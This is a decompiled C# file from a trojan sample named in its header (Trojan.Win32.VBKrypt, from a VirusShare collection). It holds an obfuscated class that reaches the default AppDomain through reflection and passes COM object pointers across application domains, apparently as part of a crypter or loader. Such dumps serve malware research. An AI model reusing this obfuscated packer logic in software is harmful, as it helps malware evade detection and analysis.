// Decompiled with JetBrains decompiler
// Type: Ç.Ú
// Assembly: Cursor, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 930472FF-67D1-4C45-9557-6B554B9B69EB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan.Win32.VBKrypt.edev-93fbe1c466b3fc7390a8ae169b1fa7267b806a8093f832236fc2bb51eaf1ff52.exe

using \u0081Ç;
using \u0082\u00B6;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace \u0081Ç
{
  [Serializable]
  internal class \u0081Ú
  {
    private IntPtr \u0081\u0097;
    private int \u0081\u0094;
    [NonSerialized]
    private AppDomain \u0081\u0093;

    public \u0081Ú(AppDomain domain, int domainId)
    {
      this.\u0081\u0094 = domainId;
      this.\u0081\u0093 = domain;
      this.\u0081\u0097 = IntPtr.Zero;
    }

    public void Î()
    {
      if (this.\u0081\u0093 == null)
        return;
      try
      {
        for (int index = 0; index < 10; ++index)
        {
          try
          {
            string friendlyName = this.\u0081\u0093.FriendlyName;
            Thread.Sleep(50);
          }
          catch (AppDomainUnloadedException ex)
          {
            break;
          }
        }
      }
      finally
      {
        \u0082µ.ü(this.\u0081\u0094);
      }
    }

    public static AppDomain \u0081\u00A8()
    {
      MethodInfo method = typeof (AppDomain).GetMethod("GetDefaultDomain", BindingFlags.Static | BindingFlags.NonPublic);
      return (object) method == null ? (AppDomain) null : method.Invoke((object) null, (object[]) null) as AppDomain;
    }

    public void \u0081\u00A3()
    {
      Marshal.GetObjectForIUnknown(this.\u0081\u0097);
      Marshal.Release(this.\u0081\u0097);
      this.\u0081\u0097 = IntPtr.Zero;
      new Thread(new ThreadStart(this.Î)).Start();
    }

    public void \u0081\u009E(object _param1, EventArgs _param2)
    {
      AppDomain appDomain = \u0081Ú.\u0081\u00A8();
      if (appDomain == null)
        return;
      CrossAppDomainDelegate callBackDelegate = new CrossAppDomainDelegate(this.\u0081\u00A3);
      this.\u0081\u0097 = Marshal.GetIUnknownForObject((object) this.\u0081\u0093);
      this.\u0081\u0093 = (AppDomain) null;
      appDomain.DoCallBack(callBackDelegate);
    }
  }
}
